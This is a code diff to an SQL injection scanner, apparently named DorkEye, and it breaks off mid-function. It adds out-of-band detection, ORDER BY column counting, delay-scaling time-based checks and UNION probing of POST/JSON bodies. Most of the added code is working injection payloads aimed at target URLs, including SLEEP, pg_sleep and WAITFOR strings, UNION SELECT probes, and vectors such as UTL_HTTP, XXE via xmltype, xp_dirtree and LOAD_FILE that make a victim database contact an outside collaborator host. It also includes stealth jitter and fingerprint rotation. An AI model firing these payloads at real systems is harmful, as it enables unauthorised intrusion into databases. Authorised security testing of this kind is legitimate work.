@@ -422,6 +422,77 @@ _MEDIUM_PRIORITY_PARAMS: frozenset = frozenset({
 
 
 # ══════════════════════════════════════════════════════════════
+#  OAST — out-of-band interaction providers (OPT-IN)
+# ══════════════════════════════════════════════════════════════
+#
+# Out-of-band detection confirms blind SQLi that leaves NO in-band signal
+# (no error, no boolean/length difference, no reliable delay) by coercing the
+# database into making an outbound DNS/HTTP request to a collaborator server
+# keyed with a unique token. A recorded interaction is essentially zero-FP
+# proof: the DB literally called out with OUR token — it cannot be explained
+# by page churn, caching, or network noise.
+#
+# DorkEye does NOT ship a collaborator server. OAST is strictly opt-in: pass a
+# provider to SQLiDetector(oast=...). With no provider, every OOB test is
+# skipped and nothing about the existing behaviour changes.
+
+
+class OASTProvider:
+    """
+    Pluggable out-of-band interaction provider.
+
+    Implement this (e.g. an interactsh-client wrapper, a Burp Collaborator
+    adapter, or a self-hosted DNS/HTTP logger) and pass it to SQLiDetector.
+
+    Contract:
+      allocate() -> (token, host)
+          Reserve a unique correlation token and return the fully-qualified
+          host the target should be coerced into contacting, e.g.
+          ("a1b2c3", "a1b2c3.oast.example").
+      confirmed(token) -> bool
+          True iff an inbound DNS/HTTP interaction tagged with `token` has been
+          observed. Implementations should tolerate propagation delay (poll
+          with a short internal wait/retry).
+    """
+
+    def allocate(self) -> Tuple[str, str]:
+        raise NotImplementedError
+
+    def confirmed(self, token: str) -> bool:
+        raise NotImplementedError
+
+
+class CallbackOAST(OASTProvider):
+    """
+    Thin OASTProvider built from a base domain and a polling callable.
+
+    Example:
+        oast = CallbackOAST(
+            base_domain="xxxx.oast.pro",
+            poll_fn=lambda token: my_interactsh.has_interaction(token),
+        )
+        detector = SQLiDetector(oast=oast)
+    """
+
+    def __init__(self, base_domain: str, poll_fn, token_factory=None):
+        self.base_domain   = base_domain.strip(".")
+        self._poll_fn      = poll_fn
+        self._token_factory = token_factory or (
+            lambda: f"dk{random.randint(10**9, 10**10 - 1)}"
+        )
+
+    def allocate(self) -> Tuple[str, str]:
+        token = self._token_factory()
+        return token, f"{token}.{self.base_domain}"
+
+    def confirmed(self, token: str) -> bool:
+        try:
+            return bool(self._poll_fn(token))
+        except Exception:
+            return False
+
+
+# ══════════════════════════════════════════════════════════════
 #  SQLiDetector — timing constants (Termux-aware)
 # ══════════════════════════════════════════════════════════════
 
@@ -439,6 +510,17 @@ _PROBE_SAMPLE_BYTES  = 8_192   # [NEW-7] cap for difflib comparison
 _BOOL_SAMPLES        = 2 if TERMUX_IS_ANDROID else 3
 _TIMEBASED_CONFIRM   = 1 if TERMUX_IS_ANDROID else 2
 _UNION_COLUMNS_MAX   = 6       # raised from 5 — most real apps use ≤6 cols
+
+# ── Time-based delay-scaling regression ──────────────────────────────────────
+# Instead of a single fixed-delay threshold, parametric sleep payloads are sent
+# at several delays and the response time is required to SCALE with the injected
+# delay. This is far more robust against one-off network spikes and against
+# targets that are simply slow: a spike inflates one sample, it does not make
+# latency track a 0→N second ramp. Delays are expressed as multiples of
+# _SLEEP_DELAY; 0 must stay fast, each step must add at least _TIMEBASED_SCALE_MIN
+# of the injected delta.
+_TIMEBASED_DELAYS     = [0, _SLEEP_DELAY, _SLEEP_DELAY * 2]  # e.g. [0, 3, 6]
+_TIMEBASED_SCALE_MIN  = 0.6    # measured Δ must be ≥ 60% of injected Δ per step
 
 # ── [FP-1] Page-stability threshold ──────────────────────────────────────────
 # Minimum similarity between two clean requests to consider the page stable
@@ -573,14 +655,43 @@ class SQLiDetector:
         re.IGNORECASE,
     )
 
-    def __init__(self, stealth: bool = False, timeout: int = _DEFAULT_READ):
-        """Initialise with stealth flag, timeout, fingerprint rotator, circuit breaker."""
+    # ── [ORDERBY] Out-of-range ORDER BY errors — used for column counting ─────
+    # When `ORDER BY n` exceeds the real column count the DB raises a distinct,
+    # position-specific error. The last n that does NOT raise it is the column
+    # count. These signatures are specific enough to be very low-FP.
+    _ORDER_BY_RANGE_RE = re.compile(
+        r"(Unknown column '?\d+'? in 'order clause'"          # MySQL/MariaDB
+        r"|ORDER BY position \d+ is not in select list"       # PostgreSQL
+        r"|The ORDER BY position number \d+ .* is out of range"  # MSSQL
+        r"|ORDER BY term out of range"                        # SQLite
+        r"|ORA-01785)",                                       # Oracle
+        re.IGNORECASE,
+    )
+
+    def __init__(self, stealth: bool = False, timeout: int = _DEFAULT_READ,
+                 oast: Optional[OASTProvider] = None,
+                 test_write_union: bool = True):
+        """
+        Initialise with stealth flag, timeout, fingerprint rotator, circuit breaker.
+
+        oast: optional out-of-band interaction provider (see OASTProvider). When
+        None, all OOB tests are skipped and behaviour is unchanged.
+
+        test_write_union: enable ORDER-BY-guided UNION probing on POST/JSON
+        bodies. ON by default (DorkEye assumes you only fuzz targets you are
+        authorised to test). Set to False to suppress it on endpoints whose
+        bodies are non-idempotent/state-changing, where replaying the request
+        with injected SQL could have side effects. OOB on POST/JSON is
+        unaffected by this flag and runs whenever a provider is set.
+        """
         self.stealth             = stealth
         self.read_timeout        = timeout
         self.circuit_breaker     = CircuitBreaker()
         self.fingerprint_rotator = HTTPFingerprintRotator()
         self._session            = self._build_session()
         self._status_cb          = None
+        self.oast                = oast
+        self.test_write_union    = test_write_union
 
     def _cb(self, msg: str) -> None:
         """Send a phase/status message to the registered callback."""
@@ -1079,6 +1190,63 @@ class SQLiDetector:
         return result
 
     # ──────────────────────────────────────────────────────────
+    #  [ORDERBY] Column-count discovery
+    # ──────────────────────────────────────────────────────────
+
+    def _discover_column_count_via(self, send) -> Optional[int]:
+        """
+        Context-agnostic ORDER BY column-count discovery.
+
+        `send(payload) -> Response|None` injects payload into the target
+        parameter in whatever context the caller owns (GET query, POST field,
+        JSON value). Increments `ORDER BY n` until the DB raises an out-of-range
+        error; the last n before that is the column count. Low-FP because the
+        error family is position-specific. Returns the count, or None when
+        inconclusive (no boundary error, ORDER BY 1 already errors, or WAF
+        noise) — in which case the caller falls back to the full UNION sweep.
+        """
+        # If ORDER BY 1 already errors, the signal is unreliable → bail out.
+        for probe1 in ("1 ORDER BY 1-- -", "1' ORDER BY 1-- -"):
+            r1 = send(probe1)
+            if r1 is not None and self._ORDER_BY_RANGE_RE.search(r1.text):
+                return None
+
+        last_ok: Optional[int] = None
+        for n in range(1, _UNION_COLUMNS_MAX + 2):   # allow boundary one past MAX
+            if _exit_requested or _skip_current:
+                break
+
+            boundary_hit = False
+            for ctx in (f"1 ORDER BY {n}-- -", f"1' ORDER BY {n}-- -"):
+                r = send(ctx)
+                if r is None:
+                    continue
+                if self._detect_waf(r):
+                    return None  # WAF noise → don't trust discovery
+                if self._ORDER_BY_RANGE_RE.search(r.text):
+                    boundary_hit = True
+                    break
+
+            if boundary_hit:
+                # n is out of range → previous n was the last valid column index.
+                return last_ok if last_ok and last_ok >= 1 else None
+
+            # No boundary error at n: treat n as a valid (in-range) position.
+            last_ok = n
+            if self.stealth:
+                _interruptible_sleep(random.uniform(0.3, 0.8))
+
+        return None
+
+    def _discover_column_count(self, url: str, param_name: str,
+                               baseline_status: int) -> Optional[int]:
+        """GET-context wrapper around _discover_column_count_via."""
+        return self._discover_column_count_via(
+            lambda p: None if self.circuit_breaker.is_dead(url)
+            else self._get(self._inject_payload(url, param_name, p))
+        )
+
+    # ──────────────────────────────────────────────────────────
     #  [2] Union-based — [FP-9] marker-confirmed instead of length-heuristic
     # ──────────────────────────────────────────────────────────
 
@@ -1120,7 +1288,25 @@ class SQLiDetector:
         marker = f"dkeyz{random.randint(10**6, 10**7 - 1)}xqz"
         mismatch_at: List[int] = []
 
-        for n_cols in range(1, _UNION_COLUMNS_MAX + 1):
+        # ── [ORDERBY] Column-count discovery pre-step ────────────────────────
+        # Find the exact column count with `ORDER BY n` first, then UNION with
+        # just that count (± a 1-column cushion). Quieter and more reliable than
+        # brute-forcing every width. Falls back to the full 1..MAX sweep when
+        # discovery is inconclusive — so this never removes existing coverage.
+        discovered = self._discover_column_count(url, param_name, baseline_status)
+        if discovered is not None:
+            col_candidates = sorted({
+                n for n in (discovered - 1, discovered, discovered + 1)
+                if 1 <= n <= _UNION_COLUMNS_MAX
+            })
+            result["evidence"].append(
+                f"ORDER BY column-count discovery → {discovered} column(s); "
+                f"UNION probing restricted to {col_candidates}"
+            )
+        else:
+            col_candidates = list(range(1, _UNION_COLUMNS_MAX + 1))
+
+        for n_cols in col_candidates:
             if self.circuit_breaker.is_dead(url):
                 break
             if _exit_requested or _skip_current:
@@ -1428,17 +1614,100 @@ class SQLiDetector:
     #  [4] Time-based blind — [NEW-3] DB-specific payloads
     # ──────────────────────────────────────────────────────────
 
+    def _measure_once(self, url: str, param_name: str, payload: str,
+                      extra_read: float) -> Tuple[float, Optional[requests.Response]]:
+        """Inject payload, perform one timed GET, return (elapsed_seconds, response)."""
+        test_url = self._inject_payload(url, param_name, payload)
+        t0       = time.monotonic()
+        resp     = self._get(test_url, extra_read=extra_read)
+        return (time.monotonic() - t0, resp)
+
+    def _time_scaling_regression(self, url: str, param_name: str, template: str,
+                                 baseline: float) -> Optional[Tuple[float, str]]:
+        """
+        Delay-scaling confirmation for a single parametric sleep template.
+
+        `template` contains a `{d}` placeholder for the injected delay in
+        seconds (e.g. "1 AND SLEEP({d})"). The template is sent at each delay in
+        _TIMEBASED_DELAYS, largest first so the slowest probe acts as a cheap
+        gate: if the maximum delay does not slow the response, the remaining
+        probes are skipped.
+
+        Confirmed only when response time TRACKS the injected delay:
+          - the 0-delay probe stays near baseline (no intrinsic slowness), and
+          - every non-zero step adds at least _TIMEBASED_SCALE_MIN of its
+            injected delta over the 0-delay sample.
+
+        A one-off network spike inflates a single sample; it does not make
+        latency follow a 0→N ramp, so this is strictly stronger than the old
+        single-threshold + double-SLEEP check (which is kept for the
+        non-parametric heavy-query engines below). Returns (slope, evidence) on
+        confirmation, else None.
+        """
+        max_delay  = max(_TIMEBASED_DELAYS)
+        extra_read = max_delay + _TIMEBASED_MARGIN + 3
+        measured: Dict[int, float] = {}
+
+        for d in sorted(_TIMEBASED_DELAYS, reverse=True):
+            if self.circuit_breaker.is_dead(url) or _exit_requested or _skip_current:
+                return None
+            elapsed, resp = self._measure_once(url, param_name, template.format(d=d), extra_read)
+            measured[d] = elapsed
+
+            if resp is not None:
+                waf = self._detect_waf(resp)
+                if waf:
+                    return None  # firewall delay is not a DB sleep
+
+            # Gate on the largest delay: if it isn't slow, no point ramping down.
+            if d == max_delay:
+                expected = baseline + max_delay * _TIMEBASED_SCALE_MIN
+                slow = (
+                    (resp is None and elapsed >= expected * 0.9)
+                    or (resp is not None and elapsed >= expected)
+                )
+                if not slow:
+                    return None
+            _interruptible_sleep(0.3)
+
+        base0 = measured.get(0, baseline)
+        # 0-delay probe must itself be fast — otherwise the "scaling" is just a
+        # uniformly slow endpoint, not an injected sleep.
+        if base0 > baseline + _TIMEBASED_MARGIN:
+            return None
+
+        # Every injected step must show at least SCALE_MIN of its delta.
+        slopes: List[float] = []
+        for d in _TIMEBASED_DELAYS:
+            if d == 0:
+                continue
+            delta = measured[d] - base0
+            if delta < d * _TIMEBASED_SCALE_MIN:
+                return None
+            slopes.append(delta / d)
+
+        if not slopes:
+            return None
+
+        avg_slope = sum(slopes) / len(slopes)
+        evidence  = (
+            "time-based delay-scaling confirmed: "
+            + "  ".join(f"d={d}s→{measured[d]:.1f}s" for d in _TIMEBASED_DELAYS)
+            + f"  slope≈{avg_slope:.2f}  baseline={baseline:.2f}s"
+        )
+        return (avg_slope, evidence)
+
     def _test_time_based_blind(self, url: str, param_name: str) -> Dict:
         """
         Inject SLEEP payloads and detect delays as time-based blind SQLi.
 
-        [NEW-3] DB-specific payload set instead of MySQL-only:
-          - MySQL/MariaDB: SLEEP()
-          - PostgreSQL:    pg_sleep()
-          - MSSQL:         WAITFOR DELAY
-          - Oracle:        heavy UTL_HTTP / dbms_pipe query (no native sleep)
-          - SQLite:        heavy cross-join query
-        Each group is tried independently; the first confirmed hit returns.
+        [NEW-3] DB-specific payload set instead of MySQL-only.
+        [SCALE] Parametric engines (MySQL/MariaDB, PostgreSQL, MSSQL) are now
+        confirmed by DELAY-SCALING REGRESSION (see _time_scaling_regression)
+        rather than a single fixed-delay threshold: response time must track a
+        0→N second ramp. Non-parametric engines (Oracle/SQLite) have no tunable
+        sleep, so they keep the original neutral-confirm + double-SLEEP guard.
+        Each engine is tried independently; the first confirmed hit returns.
         """
         result = {
             "method":     "time_based_blind",
@@ -1454,132 +1723,117 @@ class SQLiDetector:
             )
             return result
 
-        threshold  = baseline + _SLEEP_DELAY + _TIMEBASED_MARGIN
-        extra_read = _SLEEP_DELAY + _TIMEBASED_MARGIN + 3
-
-        # [NEW-3] DB-specific sleep payloads
-        sleep_payloads_groups = [
+        # ── Parametric templates ({d} = injected delay, seconds) ─────────────
+        parametric_templates = [
             # MySQL / MariaDB
-            [
-                f"1' AND SLEEP({_SLEEP_DELAY}) AND '1'='1",
-                f"1 AND SLEEP({_SLEEP_DELAY})",
-                f"1' OR SLEEP({_SLEEP_DELAY})--",
-            ],
+            "1' AND SLEEP({d}) AND '1'='1",
+            "1 AND SLEEP({d})",
+            "1' OR SLEEP({d})-- -",
             # PostgreSQL
-            [
-                f"1' AND pg_sleep({_SLEEP_DELAY})--",
-                f"1; SELECT pg_sleep({_SLEEP_DELAY})--",
-                f"1' OR pg_sleep({_SLEEP_DELAY})--",
-            ],
+            "1' AND pg_sleep({d})-- -",
+            "1; SELECT pg_sleep({d})-- -",
+            "1' OR pg_sleep({d})-- -",
             # MSSQL
-            [
-                f"1'; WAITFOR DELAY '0:0:{_SLEEP_DELAY}'--",
-                f"1 WAITFOR DELAY '0:0:{_SLEEP_DELAY}'--",
-                f"1' OR 1=1; WAITFOR DELAY '0:0:{_SLEEP_DELAY}'--",
-            ],
-            # Oracle — no native sleep; use heavy recursive query as fallback
-            [
-                "1' AND 1=(SELECT COUNT(*) FROM ALL_OBJECTS,ALL_OBJECTS,ALL_OBJECTS "
-                "WHERE ROWNUM<10)--",
-            ],
-            # SQLite — heavy cross join
-            [
-                "1 AND (SELECT COUNT(*) FROM "
-                "sqlite_master,sqlite_master,sqlite_master) AND 1=1",
-            ],
+            "1'; WAITFOR DELAY '0:0:{d}'-- -",
+            "1 WAITFOR DELAY '0:0:{d}'-- -",
+            "1' OR 1=1; WAITFOR DELAY '0:0:{d}'-- -",
         ]
 
+        for template in parametric_templates:
+            if self.circuit_breaker.is_dead(url) or _exit_requested or _skip_current:
+                break
+            sig = self._time_scaling_regression(url, param_name, template, baseline)
+            if sig is not None:
+                _slope, evidence = sig
+                result["vulnerable"] = True
+                result["confidence"] = SQLiConfidence.HIGH.value
+                result["evidence"].append(f"payload=[{template}]  {evidence}")
+                return result
+
+        # ── Non-parametric heavy-query engines (no tunable delay) ────────────
+        # Oracle / SQLite cannot scale a delay, so the original double-SLEEP
+        # confirmation is retained unchanged for them.
+        threshold  = baseline + _SLEEP_DELAY + _TIMEBASED_MARGIN
+        extra_read = _SLEEP_DELAY + _TIMEBASED_MARGIN + 3
+        heavy_payloads = [
+            # Oracle — heavy recursive cartesian product
+            "1' AND 1=(SELECT COUNT(*) FROM ALL_OBJECTS,ALL_OBJECTS,ALL_OBJECTS "
+            "WHERE ROWNUM<10)-- -",
+            # SQLite — heavy cross join
+            "1 AND (SELECT COUNT(*) FROM "
+            "sqlite_master,sqlite_master,sqlite_master) AND 1=1",
+        ]
         neutral_payload = "1' AND '1'='1"
 
-        for sleep_group in sleep_payloads_groups:
+        for sleep_payload in heavy_payloads:
             if self.circuit_breaker.is_dead(url) or _exit_requested or _skip_current:
                 break
 
-            for sleep_payload in sleep_group:
+            elapsed, response = self._measure_once(url, param_name, sleep_payload, extra_read)
+
+            sleep_triggered = (
+                (response is None and elapsed >= threshold * 0.9)
+                or (response is not None and elapsed >= threshold)
+            )
+            if not sleep_triggered:
+                continue
+
+            if response is not None:
+                waf = self._detect_waf(response)
+                if waf:
+                    result["evidence"].append(
+                        f"WAF detected ({waf}): time-based latency may be firewall delay"
+                    )
+                    continue
+
+            # Confirm with neutral requests
+            neutral_url    = self._inject_payload(url, param_name, neutral_payload)
+            confirm_times: List[float] = []
+            confirm_fails  = 0
+            for _ in range(_TIMEBASED_CONFIRM):
                 if self.circuit_breaker.is_dead(url) or _exit_requested or _skip_current:
                     break
+                t_c       = time.monotonic()
+                r_c       = self._get(neutral_url)
+                elapsed_c = time.monotonic() - t_c
+                if r_c is None:
+                    confirm_fails += 1
+                else:
+                    confirm_times.append(elapsed_c)
+                _interruptible_sleep(0.5)
 
-                test_url = self._inject_payload(url, param_name, sleep_payload)
-                t0       = time.monotonic()
-                response = self._get(test_url, extra_read=extra_read)
-                elapsed  = time.monotonic() - t0
+            if confirm_fails > 0 or not confirm_times:
+                continue
 
-                sleep_triggered = False
-                if response is None and elapsed >= threshold * 0.9:
-                    sleep_triggered = True
-                elif response is not None and elapsed >= threshold:
-                    sleep_triggered = True
-
-                if not sleep_triggered:
-                    continue
-
-                if response is not None:
-                    waf = self._detect_waf(response)
-                    if waf:
-                        result["evidence"].append(
-                            f"WAF detected ({waf}): time-based latency may be "
-                            f"firewall delay"
-                        )
-                        continue
-
-                # Confirm with neutral requests
-                neutral_url    = self._inject_payload(url, param_name, neutral_payload)
-                confirm_times: List[float] = []
-                confirm_fails  = 0
-
-                for _ in range(_TIMEBASED_CONFIRM):
-                    if self.circuit_breaker.is_dead(url) or _exit_requested or _skip_current:
-                        break
-                    t_c       = time.monotonic()
-                    r_c       = self._get(neutral_url)
-                    elapsed_c = time.monotonic() - t_c
-
-                    if r_c is None:
-                        confirm_fails += 1
-                    else:
-                        confirm_times.append(elapsed_c)
-
-                    _interruptible_sleep(0.5)
-
-                if confirm_fails > 0 or not confirm_times:
-                    continue
-
-                confirm_avg       = sum(confirm_times) / len(confirm_times)
-                confirm_threshold = baseline + _TIMEBASED_MARGIN
-
-                if confirm_avg <= confirm_threshold:
-                    # ── [FP-5] Double-SLEEP confirmation ─────────────────────
-                    # Re-send the sleep payload ONE more time. A single network
-                    # spike can delay a response without any SQLi. If the second
-                    # hit also exceeds the threshold → HIGH confidence.
-                    # If not → discard the finding (spike eliminated as FP).
-                    t_recheck  = time.monotonic()
-                    r_recheck  = self._get(test_url, extra_read=extra_read)
-                    el_recheck = time.monotonic() - t_recheck
-
-                    recheck_triggered = (
-                        (r_recheck is None and el_recheck >= threshold * 0.9)
-                        or (r_recheck is not None and el_recheck >= threshold)
-                    )
-
-                    if not recheck_triggered:
-                        result["evidence"].append(
-                            f"[FP-guard] Time-based: first hit elapsed={elapsed:.1f}s "
-                            f"confirmed neutral but SLEEP re-check did NOT trigger "
-                            f"(recheck={el_recheck:.1f}s) — discarded as network spike"
-                        )
-                        continue   # don't declare vulnerable
-
-                    result["vulnerable"] = True
-                    result["confidence"] = SQLiConfidence.HIGH.value
+            confirm_avg = sum(confirm_times) / len(confirm_times)
+            if confirm_avg <= baseline + _TIMEBASED_MARGIN:
+                # [FP-5] Double-SLEEP confirmation — re-send once; a lone spike
+                # delays one response but not two.
+                el_recheck, r_recheck = self._measure_once(
+                    url, param_name, sleep_payload, extra_read
+                )
+                recheck_triggered = (
+                    (r_recheck is None and el_recheck >= threshold * 0.9)
+                    or (r_recheck is not None and el_recheck >= threshold)
+                )
+                if not recheck_triggered:
                     result["evidence"].append(
-                        f"Time-based double-confirmed: "
-                        f"payload=[{sleep_payload[:50]}]  "
-                        f"hit1={elapsed:.1f}s  hit2={el_recheck:.1f}s  "
-                        f"threshold={threshold:.1f}s  "
-                        f"neutral={confirm_avg:.2f}s  baseline={baseline:.2f}s"
+                        f"[FP-guard] Time-based: first hit elapsed={elapsed:.1f}s "
+                        f"confirmed neutral but heavy-query re-check did NOT trigger "
+                        f"(recheck={el_recheck:.1f}s) — discarded as network spike"
                     )
-                    return result
+                    continue
+
+                result["vulnerable"] = True
+                result["confidence"] = SQLiConfidence.HIGH.value
+                result["evidence"].append(
+                    f"Time-based double-confirmed (heavy query): "
+                    f"payload=[{sleep_payload[:50]}]  "
+                    f"hit1={elapsed:.1f}s  hit2={el_recheck:.1f}s  "
+                    f"threshold={threshold:.1f}s  "
+                    f"neutral={confirm_avg:.2f}s  baseline={baseline:.2f}s"
+                )
+                return result
 
         return result
 
@@ -1677,6 +1931,200 @@ class SQLiDetector:
         return result
 
     # ──────────────────────────────────────────────────────────
+    #  [6] Out-of-band (OAST) — OPT-IN, zero-FP confirmation
+    # ──────────────────────────────────────────────────────────
+
+    def _oob_payloads(self, host: str) -> List[str]:
+        r"""
+        Standard DB-engine OOB payloads that coerce an outbound DNS/HTTP request
+        to `host`. These are the same vectors used by sqlmap/Nuclei; each is
+        harmless beyond causing the lookup. A UNC path (\\host\x) triggers an
+        SMB/DNS resolution on Windows backends.
+        """
+        unc = "\\\\" + host + "\\x"      # literal  \\<host>\x
+        return [
+            # ── Oracle ────────────────────────────────────────────────────────
+            f"1' AND (SELECT UTL_INADDR.get_host_address('{host}')) IS NOT NULL-- -",
+            f"1' AND UTL_HTTP.REQUEST('http://{host}/')=1-- -",
+            # Oracle XXE via XMLType (works even when UTL_* is revoked)
+            (
+                "1' AND extractvalue(xmltype('<?xml version=\"1.0\" "
+                "encoding=\"UTF-8\"?><!DOCTYPE root [ <!ENTITY %% rem SYSTEM "
+                f"\"http://{host}/\">%%rem;]>'),'/l')-- -"
+            ),
+            # ── Microsoft SQL Server ──────────────────────────────────────────
+            f"1'; EXEC master..xp_dirtree '{unc}'-- -",
+            f"1'; DECLARE @q VARCHAR(1024);SET @q='{unc}';EXEC master..xp_fileexist @q-- -",
+            # ── MySQL / MariaDB (Windows backends — UNC → SMB/DNS) ────────────
+            f"1' UNION SELECT LOAD_FILE('{unc}')-- -",
+            f"1' AND LOAD_FILE('{unc}')-- -",
+            # ── PostgreSQL (best-effort; needs dblink/superuser) ──────────────
+            f"1'; SELECT dblink_connect('host={host} port=80 dbname=x user=x "
+            f"password=x connect_timeout=3')-- -",
+        ]
+
+    def _oob_via(self, send, context_label: str = "") -> Dict:
+        """
+        Context-agnostic out-of-band confirmation via the configured provider.
+
+        `send(payload) -> Response|None` injects an OOB payload into the target
+        parameter (GET/POST/JSON). Fires every DB-engine vector, then polls the
+        provider. A recorded interaction is CRITICAL — the only in-band-
+        independent, essentially zero-FP SQLi signal. Skipped with no provider.
+        """
+        result = {
+            "method":     "oob_oast",
+            "vulnerable": False,
+            "confidence": SQLiConfidence.NONE.value,
+            "evidence":   [],
+        }
+        if self.oast is None:
+            return result
+
+        try:
+            token, host = self.oast.allocate()
+        except Exception as e:
+            result["evidence"].append(f"[OAST] allocate failed: {e}")
+            return result
+
+        for payload in self._oob_payloads(host):
+            if _exit_requested or _skip_current:
+                break
+            # Fire-and-forget: the in-band response is irrelevant for OOB, and
+            # many of these intentionally error. Errors are ignored.
+            try:
+                send(payload)
+            except Exception:
+                pass
+            if self.stealth:
+                _interruptible_sleep(random.uniform(0.5, 1.5))
+
+        suffix = f" via {context_label}" if context_label else ""
+        try:
+            if self.oast.confirmed(token):
+                result["vulnerable"] = True
+                result["confidence"] = SQLiConfidence.CRITICAL.value
+                result["evidence"].append(
+                    f"OOB interaction recorded for token '{token}' (host {host}"
+                    f"){suffix} — backend made an outbound request keyed to our "
+                    f"probe: confirmed out-of-band SQL injection"
+                )
+            else:
+                result["evidence"].append(
+                    f"[OAST] no interaction for token '{token}' (host {host}){suffix}"
+                )
+        except Exception as e:
+            result["evidence"].append(f"[OAST] poll failed: {e}")
+
+        return result
+
+    def _test_oob(self, url: str, param_name: str) -> Dict:
+        """GET-context wrapper around _oob_via."""
+        return self._oob_via(
+            lambda p: None if self.circuit_breaker.is_dead(url)
+            else self._get(self._inject_payload(url, param_name, p)),
+            context_label=param_name,
+        )
+
+    def _union_via(self, send, baseline_status: Optional[int] = None) -> Dict:
+        """
+        Context-agnostic ORDER-BY-guided, marker-confirmed UNION probe.
+
+        Compact sibling of _test_union_based for POST/JSON bodies: discovers the
+        column count via ORDER BY, restricts UNION widths accordingly (full
+        1..MAX fallback when inconclusive), and confirms with a random marker
+        reflected verbatim at the baseline status — the same low-FP signal the
+        GET suite uses. Column-mismatch errors are kept as a weaker LOW signal.
+        `send(payload) -> Response|None` owns the injection context.
+        """
+        result = {
+            "method":     "union_based",
+            "vulnerable": False,
+            "confidence": SQLiConfidence.NONE.value,
+            "evidence":   [],
+            "waf":        None,
+        }
+
+        # Self-contained baseline status from a benign (empty-suffix) request.
+        br = send("")
+        base_status = br.status_code if br is not None else (baseline_status or 200)
+
+        marker = f"dkeyz{random.randint(10**6, 10**7 - 1)}xqz"
+        mismatch_at: List[int] = []
+
+        discovered = self._discover_column_count_via(send)
+        if discovered is not None:
+            col_candidates = sorted({
+                n for n in (discovered - 1, discovered, discovered + 1)
+                if 1 <= n <= _UNION_COLUMNS_MAX
+            })
+            result["evidence"].append(
+                f"ORDER BY column-count discovery → {discovered} column(s); "
+                f"UNION probing restricted to {col_candidates}"
+            )
+        else:
+            col_candidates = list(range(1, _UNION_COLUMNS_MAX + 1))
+
+        for n_cols in col_candidates:
+            if _exit_requested or _skip_current:
+                break
+            null_cols = ",".join(["NULL"] * n_cols)
+            str_cols  = ",".join([f"'{marker}'"] * n_cols)
+            payloads = [
+                f"' UNION SELECT {null_cols}--",
+                f"-1 UNION SELECT {null_cols}--",
+                f"' UNION SELECT {str_cols}--",
+                f"-1 UNION SELECT {str_cols}--",
+            ]
+            for payload in payloads:
+                if _exit_requested or _skip_current:
+                    break
+                r = send(payload)
+                if r is None:
+                    continue
+                waf = self._detect_waf(r)
+                if waf:
+                    result["waf"] = waf
+                    result["evidence"].append(
+                        f"WAF detected ({waf}): UNION probe aborted at {n_cols} cols"
+                    )
+                    return result
+                body = r.text
+                if marker in body and r.status_code == base_status:
+                    result["vulnerable"] = True
+                    result["confidence"] = SQLiConfidence.HIGH.value
+                    result["evidence"].append(
+                        f"UNION marker '{marker}' reflected verbatim at n={n_cols} "
+                        f"columns — server executed the injected UNION SELECT"
+                    )
+                    return result
+                if self._UNION_COL_MISMATCH_RE.search(body):
+                    if n_cols not in mismatch_at:
+                        mismatch_at.append(n_cols)
+                    break
+                sql_match = self._match_sql_errors(body)
+                if sql_match:
+                    db_type, pattern = sql_match
+                    result["vulnerable"] = True
+                    result["confidence"] = SQLiConfidence.HIGH.value
+                    result["evidence"].append(
+                        f"UNION triggered {db_type.upper()} error at n={n_cols}: "
+                        f"{pattern[:50]}"
+                    )
+                    return result
+                if self.stealth:
+                    _interruptible_sleep(random.uniform(0.5, 1.5))
+
+        if mismatch_at:
+            result["vulnerable"] = True
+            result["confidence"] = SQLiConfidence.LOW.value
+            result["evidence"].append(
+                f"UNION col-mismatch at col(s) {mismatch_at}: UNION syntax "
+                f"processed by server (unconfirmed by marker — verify manually)"
+            )
+        return result
+
+    # ──────────────────────────────────────────────────────────
     #  Main GET entry point
     # ──────────────────────────────────────────────────────────
 
@@ -1713,6 +2161,8 @@ class SQLiDetector:
 
         baseline_status, baseline_content, baseline_len = baseline
 
+        self._cb(f"baseline OK — {len(params)} parameter(s) to test")
+
         _bl2 = self._get(url)
         if _bl2 is not None:
             waf_on_baseline = self._detect_waf(_bl2)
@@ -1740,11 +2190,15 @@ class SQLiDetector:
             if _exit_requested or _skip_current:
                 break
             if not self._probe_parameter(url, param_name, baseline_content):
+                self._cb(f"[{param_name}] parameter skipped (no reaction to probe)")
                 continue
 
             param_score = 0
 
+            self._cb(f"testing parameter '{param_name}'")
+
             # ── Error-based ───────────────────────────────────────────────────
+            self._cb(f"[{param_name}] ERROR-BASED test")
             error_result = self._test_error_based(url, param_name)
             error_result["parameter"] = param_name
             result["tests"].append(error_result)
@@ -1753,6 +2207,10 @@ class SQLiDetector:
                 result["waf_detected"] = error_result["waf"]
 
             if error_result["vulnerable"]:
+                self._cb(
+                    f"[{param_name}] error-based CONFIRMED "
+                    f"({error_result['confidence']})"
+                )
                 if error_result["confidence"] == SQLiConfidence.HIGH.value:
                     param_score += 3
                     result["vulnerable"]         = True
@@ -1763,6 +2221,7 @@ class SQLiDetector:
                     param_score += 2
 
             # ── Union-based ───────────────────────────────────────────────────
+            self._cb(f"[{param_name}] UNION-BASED test")
             union_result = self._test_union_based(
                 url, param_name, baseline_len, baseline_status
             )
@@ -1773,6 +2232,10 @@ class SQLiDetector:
                 result["waf_detected"] = union_result["waf"]
 
             if union_result["vulnerable"]:
+                self._cb(
+                    f"[{param_name}] union-based CONFIRMED "
+                    f"({union_result['confidence']})"
+                )
                 if union_result["confidence"] == SQLiConfidence.HIGH.value:
                     param_score += 3
                 elif union_result["confidence"] == SQLiConfidence.MEDIUM.value:
@@ -1783,12 +2246,14 @@ class SQLiDetector:
             # ── Boolean blind ─────────────────────────────────────────────────
             # [FP-1] Skip boolean blind on dynamically unstable pages to avoid
             # false positives from natural page variation.
+            self._cb(f"[{param_name}] BOOLEAN-BLIND test")
             if _boolean_allowed:
                 # [NEW-4] Pass baseline_content for similarity-ratio metric
                 bool_result = self._test_boolean_blind(
                     url, param_name, baseline_len, baseline_content, baseline_status
                 )
             else:
+                self._cb(f"[{param_name}] boolean-blind skipped (unstable page)")
                 bool_result = {
                     "method":     "boolean_blind",
                     "vulnerable": False,
@@ -1802,28 +2267,51 @@ class SQLiDetector:
             bool_result["parameter"] = param_name
             result["tests"].append(bool_result)
             if bool_result["vulnerable"]:
+                self._cb(
+                    f"[{param_name}] boolean-blind CONFIRMED "
+                    f"({bool_result['confidence']})"
+                )
                 if bool_result["confidence"] == SQLiConfidence.MEDIUM.value:
                     param_score += 2
                 else:
                     param_score += 1  # LOW
 
             # ── Time-based ────────────────────────────────────────────────────
